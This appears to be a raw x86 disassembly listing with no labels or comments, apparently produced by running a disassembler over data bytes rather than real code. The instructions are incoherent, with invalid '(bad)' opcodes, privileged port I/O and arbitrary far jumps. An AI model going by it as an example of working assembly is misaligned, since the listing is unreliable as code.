  41e8ec:	mov    ch,0xc
  41e8ee:	mov    bl,0xa0
  41e8f0:	aad    0x3a
  41e8f2:	pop    ds
  41e8f3:	sub    cl,BYTE PTR [ecx-0x66]
  41e8f6:	jns    0x41e8b1
  41e8f8:	mov    edi,0x400a7166
  41e8fd:	and    dl,al
  41e8ff:	aad    0xe2
  41e901:	ss push esp
  41e903:	inc    esp
  41e904:	aaa    
  41e905:	jle    0x41e92c
  41e907:	test   al,0x67
  41e909:	daa    
  41e90a:	mov    esp,0xd028d643
  41e90f:	nop
  41e910:	shr    BYTE PTR [edi+ecx*4+0x5a],1
  41e914:	loope  0x41e8a9
  41e916:	xchg   esp,eax
  41e917:	or     eax,0x826a048c
  41e91c:	pop    edi
  41e91d:	out    0x39,al
  41e91f:	in     al,dx
  41e920:	ret    
  41e921:	push   0x33
  41e923:	sbb    esp,DWORD PTR [ecx+0x6ffe443e]
  41e929:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e92a:	lahf   
  41e92b:	and    DWORD PTR [ebx+0x16180cb8],esi
  41e931:	and    bl,bh
  41e933:	repz push ebp
  41e935:	popf   
  41e936:	pop    eax
  41e937:	lahf   
  41e938:	adc    eax,0x894f673c
  41e93d:	lods   eax,DWORD PTR ds:[esi]
  41e93e:	mov    bl,0x5d
  41e940:	mov    al,ds:0xec429d61
  41e945:	mov    cl,0x9c
  41e947:	cmp    BYTE PTR [ebx],ch
  41e949:	sbb    esp,DWORD PTR [edx+0x38]
  41e94c:	xor    al,dl
  41e94e:	arpl   WORD PTR [ebp+edi*1-0x3029dc5d],sp
  41e955:	mov    DWORD PTR [ebx+0x54f95c00],0xeaba204
  41e95f:	mov    ds:0x7677b92e,al
  41e964:	fld    DWORD PTR [esi-0x42]
  41e967:	add    ebp,ecx
  41e969:	sub    BYTE PTR ds:0xa2652659,al
  41e96f:	pop    edi
  41e970:	or     esi,DWORD PTR [ecx+0x3d]
  41e973:	mov    ds:0x62dc8a6e,eax
  41e978:	test   al,0xb2
  41e97a:	and    ebp,DWORD PTR [eax+ebx*1]
  41e97d:	xchg   esi,eax
  41e97e:	inc    edx
  41e97f:	jg     0x41e99b
  41e981:	pushf  
  41e982:	lea    ebp,[edx-0x25]
  41e985:	scas   eax,DWORD PTR es:[edi]
  41e986:	mov    bl,0xd1
  41e988:	pop    eax
  41e989:	shl    DWORD PTR [eax-0xd],cl
  41e98c:	or     BYTE PTR [eax+0x39a9],ah
	...
  41e9f2:	add    BYTE PTR [eax],al
  41e9f4:	js     0x41e9f3
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	push   ds
  41ea01:	mov    dh,0x56
  41ea03:	and    DWORD PTR [ebp+eax*2+0x1040001],0xb82f0000
  41ea0e:	mov    ds:0xb7ada5b4,al
  41ea13:	dec    ebp
  41ea14:	enter  0xe7a4,0xa4
  41ea18:	in     al,0x0
  41ea1a:	out    0x90,al
  41ea1c:	in     al,0xc6
  41ea1e:	jl     0x41e9ca
  41ea20:	mov    al,ds:0x923436e3
  41ea25:	push   0x47b874f6
  41ea2a:	test   ebp,esi
  41ea2c:	xor    eax,eax
  41ea2e:	repz loopne 0x41ea77
  41ea31:	pop    esp
  41ea32:	mov    esi,0x405e9c43
  41ea37:	jge    0x41eaa0
  41ea39:	sub    esi,0xc23d0c73
  41ea3f:	mov    WORD PTR [edi-0x7a],gs
  41ea42:	jmp    0xf3956f76
  41ea47:	leave  
  41ea48:	loopne 0x41e9fb
  41ea4a:	dec    ebp
  41ea4b:	mov    al,ds:0xd19431e5
  41ea50:	mov    edi,0xee08502e
  41ea55:	jbe    0x41ea6d
  41ea57:	push   ebp
  41ea58:	pusha  
  41ea59:	sbb    eax,0x683f9946
  41ea5e:	stos   BYTE PTR es:[edi],al
  41ea5f:	xchg   esi,eax
  41ea60:	dec    ecx
  41ea61:	mov    ebx,DWORD PTR [eax+0x4a]
  41ea64:	pop    esp
  41ea65:	(bad)  
  41ea66:	mov    edx,0xe6885881
  41ea6b:	rcr    BYTE PTR [ebp+0x64],cl
  41ea6e:	and    DWORD PTR [edi-0x494f458e],ebx
  41ea74:	aas    
  41ea75:	or     BYTE PTR [esi],ch
  41ea77:	pusha  
  41ea78:	loopne 0x41ea21
  41ea7a:	pop    es
  41ea7b:	mov    ecx,0x32b3524f
  41ea80:	ror    DWORD PTR [ecx-0x1bfff791],0xf9
  41ea87:	leave  
  41ea88:	mov    al,ds:0x7f9b6198
  41ea8d:	push   cs
  41ea8e:	inc    eax
  41ea8f:	adc    al,0x2a
  41ea91:	push   ds
  41ea92:	push   ebp
  41ea93:	cmp    ch,dh
  41ea95:	aaa    
  41ea96:	inc    ebx
  41ea97:	cmp    al,0x80
  41ea99:	fldcw  WORD PTR [esi+0x2c]
  41ea9c:	jno    0x41ead0
  41ea9e:	or     bh,bl
  41eaa0:	lea    esi,[edi+ebx*1]
  41eaa3:	inc    edx
  41eaa4:	mov    WORD PTR [esp+eax*1-0x5f],cs
  41eaa8:	mov    al,ds:0x5687d449
  41eaad:	data16 ja 0x41ea6b
  41eab0:	push   ds
  41eab1:	mov    bh,0x73
  41eab3:	shl    DWORD PTR [edi+0x1c97cd84],0x81
  41eaba:	ss cmp al,0x5f
  41eabd:	push   ebp
  41eabe:	(bad)  
  41eabf:	scas   al,BYTE PTR es:[edi]
  41eac0:	inc    esp
  41eac1:	fisttp DWORD PTR [ebp+0x6]
  41eac4:	in     eax,0x5f
  41eac6:	sub    DWORD PTR [eax+0x3ece0ca6],edx
  41eacc:	sub    al,0x6b
  41eace:	out    0xcb,eax
  41ead0:	imul   ebx,DWORD PTR [edi+0x13],0x35856549
  41ead7:	enter  0xc7f0,0x64
  41eadb:	pushf  
  41eadc:	in     al,dx
  41eadd:	or     BYTE PTR [edx-0x7bd2efca],al
  41eae3:	mov    eax,0xfc7d21c2
  41eae8:	leave  
  41eae9:	inc    ebp
  41eaea:	sti    
  41eaeb:	loopne 0x41ea71
  41eaed:	mov    ecx,0x12457466
  41eaf2:	xchg   esp,eax
  41eaf3:	outs   dx,DWORD PTR ds:[esi]
  41eaf4:	mov    ds:0xb9a441b8,al
  41eaf9:	in     eax,0x55
  41eafb:	add    DWORD PTR [edx-0x45],edx
  41eafe:	int    0x77
  41eb00:	xchg   esp,eax
  41eb01:	loopne 0x41eb24
  41eb03:	mov    ebp,DWORD PTR [eax+0x50]
  41eb06:	mul    edi
  41eb08:	dec    ebx
  41eb09:	dec    eax
  41eb0a:	int    0x76
  41eb0c:	std    
  41eb0d:	dec    edx
  41eb0e:	(bad)  [edi+0x0]
	...
  41eb71:	add    BYTE PTR [eax],al
  41eb73:	add    BYTE PTR [edx],dl
  41eb75:	das    
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0xd3
  41eb81:	adc    bl,dh
  41eb83:	call   0x433230
  41eb88:	add    al,0x1
  41eb8a:	add    BYTE PTR [eax],al
  41eb8c:	fistp  DWORD PTR [ebx-0x63]
  41eb8f:	jl     0x41eb4d
  41eb91:	ja     0x41eb93
  41eb93:	push   0x2d
  41eb95:	aas    
  41eb96:	inc    esp
  41eb97:	mov    BYTE PTR [ebx],ch
  41eb99:	ins    DWORD PTR es:[edi],dx
  41eb9a:	ret    
  41eb9b:	adc    BYTE PTR [edi+edi*8-0x59ebe9ab],ch
  41eba2:	stos   DWORD PTR es:[edi],eax
  41eba3:	in     al,dx
  41eba4:	push   es
  41eba5:	loop   0x41eb87
  41eba7:	inc    edx
  41eba8:	sbb    DWORD PTR [edx-0x40531d2b],ebx
  41ebae:	dec    ecx
  41ebaf:	xchg   esi,eax
  41ebb0:	enter  0xcc1c,0x4e
  41ebb4:	(bad)
  41ebb7:	jb     0x41eb5f
  41ebb9:	mov    WORD PTR [edi],ds
  41ebbb:	loopne 0x41eb95
  41ebbd:	jg     0x41ebcd
  41ebbf:	scas   eax,DWORD PTR es:[edi]
  41ebc0:	inc    edi
  41ebc1:	or     eax,0xb64f6668
  41ebc6:	inc    edx
  41ebc7:	(bad)  
  41ebc8:	repz push esi
  41ebca:	adc    BYTE PTR [eax+0x1],bh
  41ebcd:	mov    eax,0x86b22ceb
  41ebd2:	sub    al,0xc
  41ebd4:	sub    ah,BYTE PTR [ecx-0x6ebea4ee]
  41ebda:	and    bh,BYTE PTR [edi]
  41ebdc:	cwde   
  41ebdd:	xchg   cl,bh
  41ebdf:	aad    0xf
  41ebe1:	test   al,0xb8
  41ebe3:	addr16 je 0x41ec0e
  41ebe6:	jo     0x41ec36
  41ebe8:	fstp   QWORD PTR [eax]
  41ebea:	lods   eax,DWORD PTR ds:[esi]
  41ebeb:	aas    
  41ebec:	(bad)  
  41ebed:	outs   dx,DWORD PTR ds:[esi]
  41ebee:	and    BYTE PTR [ebp-0x48],ah
  41ebf1:	notrack call DWORD PTR [ecx+0x2e336e81]
  41ebf8:	xchg   esi,eax
  41ebf9:	dec    ebx
  41ebfa:	jmp    0xe078124c
  41ebff:	ret    
  41ec00:	cld    
  41ec01:	adc    al,BYTE PTR [ecx]
  41ec03:	and    eax,0xa8d8626c
  41ec08:	in     eax,0x9c
  41ec0a:	cmp    ch,ah
  41ec0c:	adc    BYTE PTR [ebx],0xe6
  41ec0f:	mov    al,cl
  41ec11:	cdq    
  41ec12:	mov    dl,BYTE PTR [ecx+0x2a61298a]
  41ec18:	xchg   BYTE PTR [edx],cl
  41ec1a:	idiv   DWORD PTR [edx-0x24]
  41ec1d:	adc    eax,0xed558ebb
  41ec22:	adc    ebx,DWORD PTR [esi+edx*8+0x3b]
  41ec26:	cmp    BYTE PTR [ecx],cl
  41ec28:	cmp    DWORD PTR [edi+0x72c47dde],ebx
  41ec2e:	xchg   ecx,eax
  41ec2f:	jo     0x41ec03
  41ec31:	in     al,0x66
  41ec33:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41ec35:	outs   dx,BYTE PTR ds:[esi]
  41ec36:	ins    DWORD PTR es:[edi],dx
  41ec37:	adc    ah,BYTE PTR [eax]
  41ec39:	jns    0x41ec4f
  41ec3b:	rcl    ah,1
  41ec3d:	int    0xec
  41ec3f:	mov    BYTE PTR [edi],dl
  41ec41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec42:	mov    WORD PTR [ecx+0x7258d1d8],ss
  41ec48:	sub    bh,BYTE PTR [esi]
  41ec4a:	into   
  41ec4b:	mov    al,ds:0xc07bf78c
  41ec50:	inc    ecx
  41ec51:	pop    esp
  41ec52:	adc    ah,dl
  41ec54:	and    DWORD PTR [ebx+0x60],0x43
  41ec58:	in     eax,dx
  41ec59:	fcomp  QWORD PTR [edi]
  41ec5b:	adc    dl,BYTE PTR [esi-0x31]
  41ec5e:	inc    edx
  41ec5f:	jle    0x41ebec
  41ec61:	sbb    eax,0x219515ea
  41ec66:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41ec68:	push   edx
  41ec69:	sti    
  41ec6a:	es cmp eax,0xebb6a94d
  41ec70:	dec    esi
  41ec71:	mov    BYTE PTR [edx+0x602409dd],dh
  41ec77:	push   ds
  41ec78:	pop    edx
  41ec79:	ror    DWORD PTR [edi-0x1127aad2],cl
  41ec7f:	imul   esi,DWORD PTR [eax-0x5282c0fd],0xce94bfd5
  41ec89:	adc    al,0x61
  41ec8b:	or     DWORD PTR [edx+0x8b8a33],esi
	...
  41ecf1:	add    BYTE PTR [eax],al
  41ecf3:	add    BYTE PTR [ecx-0xf],al
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0x11975fd0
  41ed02:	adc    bh,BYTE PTR ds:0x147ac
  41ed08:	add    al,0x1
  41ed0a:	add    BYTE PTR [eax],al
  41ed0c:	cmp    dh,BYTE PTR [eax+0x26]
  41ed0f:	cs dec esp
  41ed11:	push   0xde06f3a3
  41ed16:	or     eax,0x49d98cbc
  41ed1b:	outs   dx,DWORD PTR ds:[esi]
  41ed1c:	dec    edx
  41ed1d:	(bad)  
  41ed1e:	fsub   QWORD PTR [ebx+ecx*4+0x73]
  41ed22:	and    al,0x12
  41ed24:	not    DWORD PTR [ebp-0x54]
  41ed27:	test   eax,0xc17b0c51
  41ed2c:	add    eax,0xa8f5eb27
  41ed31:	inc    esp
  41ed32:	fucomip st,st(2)
  41ed34:	dec    esp
  41ed35:	jno    0x41ed14
  41ed37:	ins    DWORD PTR es:[edi],dx
  41ed38:	jle    0x41ecc3
  41ed3a:	cs sbb ebx,esp
  41ed3d:	sub    ecx,DWORD PTR [esi+edx*1+0x54]
  41ed41:	sar    DWORD PTR ds:0xe9fddc54,0xc1
  41ed48:	lods   eax,DWORD PTR ds:[esi]
  41ed49:	or     BYTE PTR [edx],dl
  41ed4b:	mov    edi,0x1295b12
  41ed50:	aam    0x4c
  41ed52:	dec    esi
  41ed53:	mov    ebp,0x783cdf31
  41ed58:	int    0xb3
  41ed5a:	mov    ecx,0x8194e950
  41ed5f:	dec    ecx
  41ed60:	adc    cl,BYTE PTR [ecx]
  41ed62:	and    bl,BYTE PTR es:[ebx]
  41ed65:	stos   DWORD PTR es:[edi],eax
  41ed66:	xchg   edi,eax
  41ed67:	int    0xff
  41ed69:	cli    
  41ed6a:	xchg   esi,eax
  41ed6b:	add    al,BYTE PTR [edi]
  41ed6d:	push   eax
  41ed6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed6f:	add    BYTE PTR [eax-0x21eadfd2],bl
  41ed75:	xchg   ebp,eax
  41ed76:	add    al,0x86
  41ed78:	out    0xbd,al
  41ed7a:	jle    0x41ed54
  41ed7c:	stos   DWORD PTR es:[edi],eax
  41ed7d:	sub    BYTE PTR [edx+edx*8-0x1e26183e],0x60
  41ed85:	in     al,dx
  41ed86:	(bad)  
  41ed87:	push   0xaee4be55
  41ed8c:	sar    eax,0xfb
  41ed8f:	enter  0xc1f8,0xf5
  41ed93:	dec    ebp
  41ed94:	pop    edx
  41ed95:	and    dl,dh
  41ed97:	xor    eax,0x1766781f
  41ed9c:	mov    eax,0xf88bfba7
  41eda1:	or     DWORD PTR [ecx],0x92019f00
  41eda7:	dec    edx
  41eda8:	mov    DWORD PTR [ecx+0x4a],eax
  41edab:	imul   esi,DWORD PTR [ecx],0x357e8a9d
  41edb1:	xlat   BYTE PTR ds:[ebx]
  41edb2:	mov    dl,BYTE PTR [ebp+0x2d]
  41edb5:	fdiv   DWORD PTR [esi]
  41edb7:	push   ebp
  41edb8:	fisubr DWORD PTR [edx]
  41edba:	sbb    BYTE PTR gs:0x2751400c,bh
  41edc1:	and    al,0xd3
  41edc3:	jo     0x41ed94
  41edc5:	inc    esi
  41edc6:	push   ebp
  41edc7:	inc    edi
  41edc8:	inc    ebp
  41edc9:	ds push 0x79
  41edcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edcd:	pop    ecx
  41edce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edcf:	sbb    BYTE PTR [ebx],ah
  41edd1:	add    BYTE PTR [ecx],dl
  41edd3:	push   ecx
  41edd4:	pop    esi
  41edd5:	cmc    
  41edd6:	aad    0xd5
  41edd8:	rcl    ah,0x1d
  41eddb:	nop
  41eddc:	in     al,0xc0
  41edde:	sbb    esp,edi
  41ede0:	js     0x41ed85
  41ede2:	nop
  41ede3:	lea    ecx,[edx]
  41ede5:	xchg   ecx,eax
  41ede6:	jmp    0x814f:0x416e0ad0
  41eded:	cmp    eax,0x2e023a36
  41edf2:	mov    edi,0x2c2f95ed
  41edf7:	inc    esi
  41edf8:	and    al,BYTE PTR [ebp-0x3b290703]
  41edfe:	and    BYTE PTR [edi+edx*4],0x87
  41ee02:	das    
  41ee03:	in     al,dx
  41ee04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee05:	mov    edi,0x3675837c
  41ee0a:	ror    DWORD PTR [eax+ecx*4],cl
  41ee0d:	inc    ebp
  41ee0e:	cwde   
  41ee0f:	into   
	...
  41ee74:	add    eax,0x7b197956
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0xb019:0xceb37ae7
  41ee85:	dec    eax
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    al,0x1
  41ee8a:	add    BYTE PTR [eax],al
  41ee8c:	xchg   esp,eax
  41ee8d:	mov    esp,0xe49d76a0
  41ee92:	repnz clc 
  41ee94:	inc    edi
  41ee95:	jle    0x41ee26
  41ee97:	ins    DWORD PTR es:[edi],dx
  41ee98:	jmp    0x41ee58
  41ee9a:	sbb    esp,DWORD PTR [ecx+0x342e4bbf]
  41eea0:	cmp    edx,DWORD PTR [esi+0x3aebc227]
  41eea6:	rcr    BYTE PTR [eax],cl
  41eea8:	fcom   QWORD PTR [eax+0x39bf9f95]
  41eeae:	outs   dx,DWORD PTR ds:[esi]
  41eeaf:	aas    
  41eeb0:	out    0xde,al
  41eeb2:	sti    
  41eeb3:	fimul  DWORD PTR [ebp-0x29]
  41eeb6:	aas    
  41eeb7:	sbb    cl,0x22
  41eeba:	jae    0x41ee5a
  41eebc:	mov    ds:0x1cb586d1,al
  41eec1:	addr16 cdq 
  41eec3:	inc    ebp
  41eec4:	pop    ds
  41eec5:	push   ds
  41eec6:	ins    DWORD PTR es:[edi],dx
  41eec7:	and    bh,BYTE PTR [eax-0x3498be30]
  41eecd:	pop    ds
  41eece:	(bad)  
  41eecf:	xor    DWORD PTR [ecx],eax
  41eed1:	in     al,dx
  41eed2:	mov    ecx,0xf1515d9c
  41eed7:	mov    dl,0xbf
  41eed9:	ror    DWORD PTR [esi-0x10],1
  41eedc:	or     DWORD PTR [edx],edi
  41eede:	je     0x41ef4d
  41eee0:	js     0x41ee8d
  41eee2:	ds mov ebp,0x324c86f1
  41eee8:	xor    edi,DWORD PTR [eax-0x57]
  41eeeb:	cmp    al,0x81
  41eeed:	or     ch,BYTE PTR [ecx-0x79e63dbd]
  41eef3:	add    esi,DWORD PTR [ebp+ebx*2+0x65]
  41eef7:	jmp    0xf61329d7
  41eefc:	lods   eax,DWORD PTR ds:[esi]
  41eefd:	call   0xa3d9:0xfecee96
  41ef04:	pop    edi
  41ef05:	lock or dh,ah
  41ef08:	mov    al,ds:0x2632872a
  41ef0d:	jmp    0xbad5:0x28d0714a
  41ef14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef15:	ins    BYTE PTR es:[edi],dx
  41ef16:	sbb    eax,0xd195ae85
  41ef1b:	push   cs
  41ef1c:	mov    esi,0x1c38f23f
  41ef21:	or     dl,BYTE PTR [edi+0x6c5927a6]
  41ef27:	pop    ebx
  41ef28:	in     eax,0x3
  41ef2a:	pop    ds
  41ef2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef2c:	mov    BYTE PTR ds:0xb55c32b1,al
  41ef32:	scas   eax,DWORD PTR es:[edi]
  41ef33:	xchg   esp,eax
  41ef34:	je     0x41ef48
  41ef36:	sbb    BYTE PTR [edi+ecx*1+0x631dd63f],bl
  41ef3d:	repnz inc eax
  41ef3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef40:	pop    edi
  41ef41:	int    0x1a
  41ef43:	out    dx,eax
  41ef44:	loope  0x41ef10
  41ef46:	scas   al,BYTE PTR es:[edi]
  41ef47:	mov    ah,0x6c
  41ef49:	mov    al,ds:0x9b5d4ea3
  41ef4e:	retf   0x78e8
  41ef51:	mov    ebx,0x8a184cbe
  41ef56:	(bad)  
  41ef57:	push   cs
  41ef58:	call   0x3351d433
  41ef5d:	test   BYTE PTR ds:0x8929bb0a,bh
  41ef63:	dec    esi
  41ef64:	adc    eax,0x5b4ffa31
  41ef69:	xchg   esi,eax
  41ef6a:	dec    esi
  41ef6b:	retf   
  41ef6c:	pop    ebx
  41ef6d:	aaa    
  41ef6e:	fsubrp st(2),st
  41ef70:	cmp    BYTE PTR [esi],0xc6
  41ef73:	loopne 0x41ef1d
  41ef75:	sti    
  41ef76:	jmp    0x41ef9a
  41ef78:	jo     0x41efb2
  41ef7a:	lds    esi,FWORD PTR [ebp+0x7b8fcc46]
  41ef80:	pusha  
  41ef81:	das    
  41ef82:	out    0x98,al
  41ef84:	ss nop
  41ef86:	push   esi
  41ef87:	jb     0x41efdc
  41ef89:	mov    edx,DWORD PTR [ebp+0x57]
  41ef8c:	scas   eax,DWORD PTR es:[edi]
  41ef8d:	int3   
  41ef8e:	mov    al,ds:0xe2
	...
  41eff3:	add    BYTE PTR [ecx-0xda40a3],bh
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul ebp,DWORD PTR [ebp-0x4be14f6d],0x49
  41f006:	add    DWORD PTR [eax],eax
  41f008:	add    al,0x1
  41f00a:	add    BYTE PTR [eax],al
  41f00c:	adc    DWORD PTR [ecx],edi
  41f00e:	mov    cl,0x55
  41f010:	std    
  41f011:	fst    QWORD PTR gs:[edx]
  41f014:	gs inc esp
  41f016:	lahf   
  41f017:	mov    ebx,0x5a6f1559
  41f01c:	adc    bl,BYTE PTR [ebp+0x43]
  41f01f:	sub    ebp,DWORD PTR [edx+0x46694810]
  41f025:	loopne 0x41f02b
  41f027:	mov    eax,ds:0x8502df8c
  41f02c:	xor    ebp,DWORD PTR [ebx]
  41f02e:	sbb    eax,0x32b76c0e
  41f033:	sub    ah,BYTE PTR [edx]
  41f035:	xchg   BYTE PTR [edi],cl
  41f037:	inc    edx
  41f038:	pop    edx
  41f039:	outs   dx,BYTE PTR ds:[esi]
  41f03a:	jo     0x41f055
  41f03c:	mov    bl,0x96
  41f03e:	mov    bh,0x6
  41f040:	pop    ss
  41f041:	xchg   edi,eax
  41f042:	pop    ebx
  41f043:	retf   
  41f044:	cs fwait
  41f046:	out    0xb5,al
  41f048:	rcr    esi,cl
  41f04a:	xchg   esp,eax
  41f04b:	push   eax
  41f04c:	and    dh,BYTE PTR [edi-0x568f06de]
  41f052:	adc    dl,BYTE PTR [ebp+eax*1-0xd]
  41f056:	xor    DWORD PTR ds:0x83663cbe,edi
  41f05c:	mov    ah,0xbc
  41f05e:	es ss pushf 
  41f061:	adc    bl,BYTE PTR [ebx]
  41f063:	sub    esi,DWORD PTR [ebp-0x3b773ff1]
  41f069:	push   ds
  41f06a:	mov    WORD PTR [edi],es
  41f06c:	mov    ch,bh
  41f06e:	pop    ebx
  41f06f:	push   eax
  41f070:	mov    edi,0xe4495b08
  41f075:	xchg   edi,eax
  41f076:	jae    0x41f04f
  41f078:	adc    eax,0x591f05b2
  41f07d:	dec    edx
  41f07e:	push   edi
  41f07f:	pop    es
  41f080:	mov    ebx,0x4caab8f8
  41f085:	cmp    DWORD PTR [esi],edx
  41f087:	sub    eax,0xc86b9439
  41f08c:	inc    edx
  41f08d:	add    al,0xb8
  41f08f:	cmp    BYTE PTR [eax+ebp*8],dh
  41f092:	xlat   BYTE PTR ds:[ebx]
  41f093:	jge    0x41f102
  41f095:	inc    eax
  41f096:	adc    al,0x46
  41f098:	int    0x2a
  41f09a:	into   
  41f09b:	js     0x41f0fb
  41f09d:	lahf   
  41f09e:	inc    edx
  41f09f:	mov    al,0xf4
  41f0a1:	test   BYTE PTR [ecx-0x57],cl
  41f0a4:	xor    BYTE PTR [ebx],al
  41f0a6:	out    0xd7,al
  41f0a8:	jge    0x41f128
  41f0aa:	or     ebp,0x21
  41f0ad:	mov    ecx,0x3ccb0052
  41f0b2:	ins    DWORD PTR es:[edi],dx
  41f0b3:	(bad)  
  41f0b4:	imul   ebx,DWORD PTR [ecx],0x9c368a3
  41f0ba:	pushf  
  41f0bb:	push   0xffffffb8
  41f0bd:	inc    ebx
  41f0be:	aad    0xb8
  41f0c0:	xor    DWORD PTR [ebp+edi*1+0x44b6ce09],eax
  41f0c7:	addr16 daa 
  41f0c9:	(bad)  
  41f0ca:	mov    edi,0x58a4a45a
  41f0cf:	fisttp DWORD PTR [esi+0x7d]
  41f0d2:	out    dx,eax
  41f0d3:	pop    ebp
  41f0d4:	mov    WORD PTR [edi+0x3f44f85b],ss
  41f0da:	inc    edx
  41f0db:	adc    DWORD PTR [ebp+0x3c],esi
  41f0de:	inc    edx
  41f0df:	(bad)  [ecx-0x14]
  41f0e2:	add    al,0x25
  41f0e4:	xchg   ebp,eax
  41f0e5:	ror    BYTE PTR [ebx+0x18],cl
  41f0e8:	add    sp,WORD PTR [edx-0x2b]
  41f0ec:	ds scas al,BYTE PTR es:[edi]
  41f0ee:	scas   al,BYTE PTR es:[edi]
  41f0ef:	bnd jae 0x41f168
  41f0f2:	or     ah,BYTE PTR [ecx+0x46790f83]
  41f0f8:	ins    BYTE PTR es:[edi],dx
  41f0f9:	mov    dh,0x2f
  41f0fb:	int    0xcb
  41f0fd:	aad    0x81
  41f0ff:	out    dx,eax
  41f100:	push   edi
  41f101:	fs mov ebp,0xf0744282
  41f107:	mov    bl,BYTE PTR [edi+eiz*1-0x1a]
  41f10b:	into   
  41f10c:	cmp    eax,0xfce385
	...
  41f171:	add    BYTE PTR [eax],al
  41f173:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4ab8:0x605bd109
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    al,0x1
  41f18a:	add    BYTE PTR [eax],al
  41f18c:	pop    esp
  41f18d:	in     al,dx
  41f18e:	daa    
  41f18f:	pusha  
  41f190:	dec    esp
  41f191:	mov    bh,0xa6
  41f193:	in     al,0xf0
  41f195:	out    0xe6,al
  41f197:	jmp    0x41f1d7
  41f199:	ins    BYTE PTR es:[edi],dx
  41f19a:	mov    DWORD PTR [ecx+0x1ebf3ed7],ecx
  41f1a0:	mov    DWORD PTR [ebp+0x2cc28a66],0x8b6c86ca
  41f1aa:	cmp    BYTE PTR [ebp-0xb],0x10
  41f1ae:	sub    BYTE PTR ds:0x18549eb2,bh
  41f1b4:	jnp    0x41f14e
  41f1b6:	pop    ecx
  41f1b7:	(bad)  
  41f1b8:	imul   ebx,ebx,0x68c6e8cf
  41f1be:	jne    0x41f208
  41f1c0:	pusha  
  41f1c1:	fst    QWORD PTR [edi-0xa45fb89]
  41f1c7:	pop    edx
  41f1c8:	pop    ds
  41f1c9:	adc    ah,BYTE PTR [ebx]
  41f1cb:	jno    0x41f18b
  41f1cd:	and    BYTE PTR [edx-0x6929f80b],al
  41f1d3:	mov    ah,BYTE PTR [edi+0x19271216]
  41f1d9:	push   0x4f
  41f1db:	or     eax,0x6f9f11b2
  41f1e0:	int3   
  41f1e1:	std    
  41f1e2:	jb     0x40afbeee
  41f1e8:	and    ebp,DWORD PTR [ebp+eiz*8-0x167b3762]
  41f1ef:	or     dh,BYTE PTR [edi-0x5d]
  41f1f2:	xor    DWORD PTR [ebp-0x7718aae],ebx
  41f1f8:	lock fs shr ah,cl
  41f1fc:	mov    ebp,0x393f78ef
  41f201:	dec    edi
  41f202:	jp     0x41f1bc
  41f204:	cmc    
  41f205:	jbe    0x41f271
  41f207:	xor    ah,BYTE PTR [ebx+0x3df2e881]
  41f20d:	push   ebx
  41f20e:	call   0x68a1:0x1a4ed333
  41f215:	mov    edx,eax
  41f217:	or     DWORD PTR [ebx],ebp
  41f219:	add    ebx,DWORD PTR [eax]
  41f21b:	cmp    dh,dl
  41f21d:	mov    edi,0x6329c42f
  41f222:	add    BYTE PTR ds:0x7f9e133,al
  41f228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f229:	fimul  DWORD PTR [ebp+0x4a]
  41f22c:	cmp    BYTE PTR [esi-0x57591440],cl
  41f232:	adc    eax,0x68c72bba
  41f237:	out    dx,eax
  41f238:	xchg   DWORD PTR [eax],ebx
  41f23a:	push   ecx
  41f23b:	adc    eax,0x9569a772
  41f240:	loopne 0x41f1d3
  41f242:	push   es
  41f243:	(bad)  
  41f244:	fisubr WORD PTR [edi+0xcfbb643]
  41f24a:	fdivr  st(1),st
  41f24c:	lods   al,BYTE PTR ds:[esi]
  41f24d:	int    0xfe
  41f24f:	dec    eax
  41f250:	push   eax
  41f251:	mov    ds:0x8e44d5a0,al
  41f256:	sub    BYTE PTR [ecx],0x71
  41f259:	sub    ebp,esi
  41f25b:	cmp    eax,0xca122064
  41f260:	add    BYTE PTR [edi-0x3a],0x6e
  41f264:	in     eax,dx
  41f265:	or     eax,0xc44a7922
  41f26a:	mov    ah,0xde
  41f26c:	pop    eax
  41f26d:	jge    0x41f269
  41f26f:	xor    DWORD PTR [ebx-0x74],eax
  41f272:	jo     0x41f1fa
  41f274:	data16 fisubr WORD PTR [ecx]
  41f277:	add    eax,0x4453f51f
  41f27c:	imul   esi,ebp,0x8ea7a21b
  41f282:	sub    al,0xfb
  41f284:	hlt    
  41f285:	enter  0x9637,0xdd
  41f289:	lods   eax,DWORD PTR ds:[esi]
  41f28a:	fidivr DWORD PTR [ebx+0x38302f55]
	...
  41f2f4:	push   ecx
  41f2f5:	sbb    edi,edi
  41f2f7:	jmp    si
  41f2fa:	fnstcw WORD PTR [edi]
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f2c0
  41f301:	out    dx,eax
  41f302:	and    eax,DWORD PTR [eax]
  41f304:	mov    esp,0x400014b
  41f309:	add    DWORD PTR [eax],eax
  41f30b:	add    BYTE PTR [edi-0x1de0e14a],bl
  41f311:	imul   edx,DWORD PTR [esi-0x41],0x8b8c025b
  41f318:	ds mov ebx,0x30c88743
